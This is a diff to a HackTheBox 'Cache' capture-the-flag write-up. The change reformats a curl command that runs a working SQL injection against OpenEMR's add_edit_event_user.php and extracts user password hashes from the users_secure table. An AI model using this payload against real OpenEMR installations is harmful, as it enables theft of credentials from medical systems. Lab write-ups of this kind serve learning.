@@ -23,8 +23,6 @@ Cache is a machine on HackTheBox platoform with the IP address 10.10.10.188. Thi
 
 ### Information Gathering
 
-![author_page.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/8ae0d3e9aa8a4701bb3942252aade0fa.png)
-
 The login form html code do not indicate any URL to process the data. That can only mean two things. First, the login page might just be a decoy or client script is excute to handle the login process. I searched for javascript files and found ash login credentials.
 
 ![login_creds.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/ceaca8faecc849c598ebf2efbbf4efe8.png)
@@ -67,8 +65,16 @@ The code behind the authentification mechanism verify if the user has some sessi
 The `add_edit_event_user_page` is vulnerable to sql injection. Change the cookie header and execute the commmand below to get the credential of an OpenEMR user.
 
 ```bash
-curl -i -s -k -X $'GET'     -H $'Cache-Control: no-cache' -H $'Cookie: PHPSESSID=n30rpgmfkjg559hcov0iiurc92' -H $'User-Agent: sqlmap/1.4.8#stable (http://sqlmap.org)' -H $'Host: hms.htb' -H $'Accept: */*' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close'     -b $'PHPSESSID=n30rpgmfkjg559hcov0iiurc92'     $'http://hms.htb/portal/add_edit_event_user.php?eid=-2059%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x4141414141%2CIFNULL%28CAST%28password%20AS%20NCHAR%29%2C0x20%29%2C0x4141414141%2CIFNULL%28CAST%28username%20AS%20NCHAR%29%2C0x20%29%2C0x4141414141%29%2CNULL%20FROM%20openemr.users_secure--%20-' | tail -n2 | gunzip | awk -F "AAAAA" '{print "
-password: "$2;print "username: "$3}'
+curl -i -s -k -X $'GET' \
+-H $'Cache-Control: no-cache' \
+-H $'Cookie: PHPSESSID=n30rpgmfkjg559hcov0iiurc92' \
+-H $'User-Agent: sqlmap/1.4.8#stable (http://sqlmap.org)' \
+-H $'Host: hms.htb' \
+-H $'Accept: */*' \
+-H $'Accept-Encoding: gzip, deflate' \
+-H $'Connection: close' \
+-b $'PHPSESSID=n30rpgmfkjg559hcov0iiurc92' \
+$'http://hms.htb/portal/add_edit_event_user.php?eid=-2059%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x4141414141%2CIFNULL%28CAST%28password%20AS%20NCHAR%29%2C0x20%29%2C0x4141414141%2CIFNULL%28CAST%28username%20AS%20NCHAR%29%2C0x20%29%2C0x4141414141%29%2CNULL%20FROM%20openemr.users_secure--%20-' | tail -n2 | gunzip | awk -F "AAAAA" '{print "password: "$2;print "username: "$3}'
 ```
 
 The password found were hashed and stated with the characters `$2a$05` which indicate the password has been hashed with a Bcrypt algorithm.
